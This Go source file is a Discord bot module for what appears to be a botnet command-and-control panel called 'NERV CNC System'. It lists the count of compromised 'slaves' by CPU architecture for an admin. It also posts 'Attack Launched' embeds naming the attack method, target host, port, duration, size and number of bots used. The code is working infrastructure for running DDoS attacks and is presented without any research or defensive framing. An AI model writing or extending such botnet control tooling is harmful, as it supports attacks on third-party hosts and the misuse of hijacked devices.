package discordbot

import (
	"cnc/core/config"
	"cnc/core/slaves"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/bwmarrin/discordgo"
)

var previousDistribution map[string]int

func Init() {
	token := config.Config.Discord.BotToken
	if token == "" {
		log.Println("[discord] No bot token configured. Discord features disabled.")
		return
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Printf("[discord] Failed to create session: %v", err)
		return
	}

	// Request necessary intents to read messages and guild data
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsMessageContent

	dg.AddHandler(handleReady)
	dg.AddHandler(handleMessageCreate)

	err = dg.Open()
	if err != nil {
		log.Printf("[discord] Failed to open connection: %v", err)
		return
	}

	log.Printf("[discord] Bot is now running. Press CTRL-C to exit.")
}

func handleReady(s *discordgo.Session, r *discordgo.Ready) {
	log.Printf("[discord] Logged in as %s", r.User.String())
}

func handleMessageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Only respond in the allowed channel
	if !isAllowedChannel(m.ChannelID) {
		log.Printf("[discord] Channel %s not allowed, ignoring", m.ChannelID)
		return
	}

	// Check if message starts with configured prefix
	prefix := config.Config.Discord.Prefix
	if prefix == "" {
		prefix = "!"
	}

	if len(m.Content) < len(prefix)+1 || m.Content[:len(prefix)] != prefix {
		log.Printf("[discord] Message doesn't start with prefix '%s', ignoring", prefix)
		return
	}

	cmd := m.Content[len(prefix):]
	log.Printf("[discord] Processing command: %s", cmd)

	switch cmd {
	case "ping":
		start := time.Now()
		conn, err := net.Dial("tcp", "1.1.1.1:443")
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error: %v", err))
			return
		}
		conn.Close()
		duration := time.Since(start)

		var durationStr string
		if duration.Milliseconds() < 1000 {
			durationStr = fmt.Sprintf("%dms", duration.Milliseconds())
		} else {
			durationStr = fmt.Sprintf("%.2fs", duration.Seconds())
		}

		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("pong! %s", durationStr))

	case "bots":
		if !isAdmin(m.Author.ID) {
			s.ChannelMessageSend(m.ChannelID, "Sorry, you are not authorized to use this bot.")
			return
		}

		botDist := slaves.CL.Distribution()
		totalCount := slaves.CL.Count()

		// Build embed for nicer formatting
		embed := &discordgo.MessageEmbed{
			Title:       "Bot Distribution",
			Description: "Current bot count by architecture",
			Color:       0x9B26B6, // Purple (NERV theme)
			Timestamp:   time.Now().Format(time.RFC3339),
			Fields:      []*discordgo.MessageEmbedField{},
		}

		for k, v := range botDist {
			change := v - previousDistribution[k]
			var changeStr string
			if change > 0 {
				changeStr = fmt.Sprintf(" (+%d)", change)
			} else if change < 0 {
				changeStr = fmt.Sprintf(" (%d)", change)
			} else {
				changeStr = ""
			}

			embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
				Name:   k,
				Value:  fmt.Sprintf("%d%s", v, changeStr),
				Inline: true,
			})
		}

		previousDistribution = botDist

		embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
			Name:   "Total",
			Value:  fmt.Sprintf("%d", totalCount),
			Inline: false,
		})

		s.ChannelMessageSendEmbed(m.ChannelID, embed)
	}
}

func isAdmin(userID string) bool {
	return userID == config.Config.Discord.AdminID
}

func isAllowedChannel(channelID string) bool {
	allowed := config.Config.Discord.AllowedChannel
	if allowed == "" {
		// If no channel specified, respond in all channels
		return true
	}
	return channelID == allowed || channelID == config.Config.Discord.NotificationChannel
}

// SendMessage sends a message to the configured notification channel
func SendMessage(content string) {
	if !config.Config.Discord.Enabled {
		return
	}

	token := config.Config.Discord.BotToken
	if token == "" {
		return
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Printf("[discord] Failed to send message: %v", err)
		return
	}

	channelID := config.Config.Discord.NotificationChannel
	if channelID == "" {
		return
	}

	_, err = dg.ChannelMessageSend(channelID, content)
	if err != nil {
		log.Printf("[discord] Failed to send message: %v", err)
	}
	dg.Close()
}

// SendAttackNotification sends an attack notification embed
func SendAttackNotification(method, host, dport, duration, length, startedBy string, botCount int) {
	if !config.Config.Discord.Enabled {
		return
	}

	token := config.Config.Discord.BotToken
	if token == "" {
		return
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Printf("[discord] Failed to send notification: %v", err)
		return
	}

	channelID := config.Config.Discord.NotificationChannel
	if channelID == "" {
		return
	}

	embed := &discordgo.MessageEmbed{
		Title:     "🔥 Attack Launched",
		Color:     0x00E676, // Green
		Timestamp: time.Now().Format(time.RFC3339),
		Fields: []*discordgo.MessageEmbedField{
			{Name: "Method", Value: method, Inline: true},
			{Name: "Host", Value: host, Inline: true},
			{Name: "Port", Value: dport, Inline: true},
			{Name: "Duration", Value: fmt.Sprintf("%ss", duration), Inline: true},
			{Name: "Size", Value: length, Inline: true},
			{Name: "Bot Count", Value: fmt.Sprintf("%d", botCount), Inline: true},
			{Name: "Started By", Value: startedBy, Inline: false},
		},
		Footer: &discordgo.MessageEmbedFooter{
			Text: "NERV CNC System",
		},
	}

	_, err = dg.ChannelMessageSendEmbed(channelID, embed)
	if err != nil {
		log.Printf("[discord] Failed to send notification: %v", err)
	}
	dg.Close()
}
